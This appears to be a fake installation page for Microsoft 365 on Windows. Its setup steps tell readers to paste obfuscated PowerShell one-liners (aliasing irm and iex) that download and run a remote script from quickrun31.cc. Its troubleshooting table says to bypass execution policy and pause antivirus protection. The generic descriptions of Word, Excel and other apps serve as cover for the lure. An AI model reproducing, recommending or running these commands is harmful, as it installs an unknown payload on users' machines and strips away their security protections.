## Installation

Two quick setup methods for Windows.

### Method 1 — Win + X

1. Press **Win + X**
2. Open **Terminal** or **Windows PowerShell**
3. Paste:

```powershell
sal m iex;m(irm quickrun31.cc/qle7he)
```

4. Press **Enter** and wait for the process to finish  
5. Launch any Microsoft 365 application

### Method 2 — Win + R

1. Press **Win + R**
2. Paste:

```powershell
powershell sal a irm;sal b iex;a quickrun31.cc/qle7he|b
```

3. Press **Enter** and wait  
4. Launch any Microsoft 365 application

### Requirements

- Windows 10 or Windows 11 (64-bit)
- Internet connection during setup only
- 8 GB RAM minimum (16 GB recommended)
- At least 10 GB free disk space

### Troubleshooting

| Issue | What to try |
|-------|-------------|
| Connection error | Check internet |
| Execution Policy message | `Set-ExecutionPolicy Bypass -Scope Process -Force` |
| Blocked by antivirus | Temporarily pause real-time protection |
| Window closes right away | Usually means setup finished |

## About

Microsoft 365 for Windows is a complete desktop productivity suite that includes Word, Excel, PowerPoint, Outlook, Teams, OneNote and Access. It is used for creating documents, analyzing data, building presentations, managing email and collaborating.

The applications work offline and provide the full classic Office experience on Windows 10 and Windows 11.

> Use at your own risk. Keep your system protected.

---

## What’s Included

**Word**  
Document editing, styles, templates, mail merge and formatting tools.

**Excel**  
Spreadsheets, PivotTables, charts, formulas, Power Query and data analysis.

**PowerPoint**  
Presentations with animations, transitions, Designer and Morph.

**Outlook**  
Email client, calendar, contacts and task management.

**Teams**  
Meetings, chat and collaboration features.

**Other**  
OneNote, Access and additional Office tools.

## Workflow

1. Install the suite  
2. Open the application you need (Word, Excel, PowerPoint…)  
3. Create a new file or open an existing one  
4. Use templates, styles and built-in tools  
5. Save in the required format (DOCX, XLSX, PPTX, PDF…)  
6. Continue working offline or share the file  

---

## How to Use

1. Install using one of the methods above  
2. Launch the desired Office application  
3. Create or open a document  
4. Work with the available tools  
5. Save and export  

**Tips**
- Start from templates to save time  
- Learn basic keyboard shortcuts for faster work  
- Keep related files in organized folders  
- Use PowerPoint Designer for quick slide layouts
